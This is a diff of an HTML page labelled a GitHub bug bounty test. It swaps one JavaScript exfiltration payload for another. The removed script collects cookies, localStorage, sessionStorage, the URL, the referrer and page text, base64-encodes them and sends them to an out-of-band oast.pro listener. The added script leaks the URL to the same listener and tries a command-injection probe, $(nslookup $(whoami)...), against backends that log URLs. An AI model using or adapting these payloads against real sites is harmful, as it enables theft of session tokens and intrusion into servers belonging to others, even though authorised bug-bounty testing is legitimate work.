@@ -1,26 +1,33 @@
-<script>
-(function(){
-    // GIthub Bug Bounty Test 
-    // 1. Configuration: Your callback listener
-    var callback = "https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/log";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Github Bug Bounty Test</title>
+</head>
+<body>
+    <script>
+        (function() {
+            // Your Collaborator ID
+            var oobID = "d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro"; 
+            
+            // 1. We try to leak the local info (URL/Referrer) first
+            var localInfo = btoa(window.location.href || document.referrer);
+            
+            // 2. We use an Image to bypass CORS entirely.
+            // Even if the command injection fails, we will see this request.
+            var img1 = new Image();
+            img1.src = "https://" + oobID + "/info?d=" + localInfo;
 
-    // 2. Data Gathering
-    var exfilData = {
-        location: window.location.href,
-        referrer: document.referrer,
-        cookies: document.cookie, // Often empty if HttpOnly is set
-        localStorage: JSON.stringify(localStorage), // Sentry often stores tokens here
-        sessionStorage: JSON.stringify(sessionStorage),
-        dom_preview: document.body.innerText.substring(0, 500), // Preview of the internal page
-        date: new Date().toISOString()
-    };
-
-    // 3. Encoding to Base64 (Standard for OOB exfiltration)
-    var payload = btoa(unescape(encodeURIComponent(JSON.stringify(exfilData))));
-
-    // 4. Transmission
-    // We use an <img> tag for the callback because it often bypasses strict CSP/CORS
-    var img = new Image();
-    img.src = callback + "?d=" + payload;
-})();
-</script>
+            // 3. We attempt the RCE Seek via a URL parameter.
+            // Some backends log the URL via Sentry - if they do, this triggers.
+            var img2 = new Image();
+            img2.src = "https://" + oobID + "/rce?cmd=$(nslookup $(whoami)." + oobID + ")";
+            
+            console.log("Probes sent to listener.");
+        })();
+    </script>
+    
+    <noscript>
+        <img src="https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/no-js-warning">
+    </noscript>
+</body>
+</html>
